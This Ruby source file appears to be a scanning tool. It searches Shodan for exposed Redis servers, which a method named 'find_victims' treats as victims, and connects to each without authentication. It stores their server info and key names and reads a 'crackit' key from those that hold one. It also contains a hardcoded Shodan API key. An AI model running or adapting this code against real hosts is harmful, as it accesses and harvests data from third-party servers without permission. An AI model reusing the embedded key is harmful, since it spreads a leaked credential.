require 'ipaddr'
require 'awesome_print'
require 'redis'
require 'resolv'

MY_API_KEY = "JsyCs77Kh69kc6MyrHkZ0mgwXWe4XSXZ"
class Pig
  def self.hostinfo
    Node.find_each do |node|
      next if node.country_name.present?
      api = Shodan::Shodan.new(MY_API_KEY)
      begin
        puts node.ip
        result = api.host node.ip
        node.hostinfo = result.to_json
        result.keys.each do |k|
          puts result[k].to_json.size
          next if result[k].to_json.size > (1024 * 100)
          node.send("#{k}=", result[k].to_json) if Node.column_names.include? k
        end
        node.save
      rescue Exception => e
        puts e.backtrace
        puts e
      end
    end
  end

  def self.find_victims
    api = Shodan::Shodan.new(MY_API_KEY)
    result = api.count('redis product:"Redis key-value store"')
    total = result["total"]

    1.upto(total/100 + 1 ).each do |page|
      result = api.search('redis product:"Redis key-value store"', page: page)
      result["matches"].each do |victim|
        ip = IPAddr.new(victim['ip'], Socket::AF_INET).to_s
        port = victim['port']

        begin
          puts "#{ip}:#{port}"
          redis = Redis.new(:host => ip, :port => port)
          node = Node.redis.find_or_initialize_by(ip: ip)
          node.port = port
          node.raw_response = redis.info.to_json
          node.keys = redis.keys("*")[0..100].to_json
          node.save
        rescue Exception => e
          puts e
        end
      end
    end
  end

  def self.resolve_hostname
    Node.find_each do |node|
      next if node.hostname.present?
      begin
        node.hostname = Resolv.getname node.ip
        node.save
      rescue Exception => e
        puts e
      end
    end
  end



  def self.decode_crackit
    Node.redis.each do |node|
      if node.crackit_content.blank? && JSON.parse(node.keys).include?("crackit")
        begin
          puts node.ip
          redis = Redis.new(:host => node.ip, :port => node.port)
          node.crackit_content = redis.get("crackit")
          node.save
        rescue Exception =>  e
          puts e
        end
      end
    end
  end

end
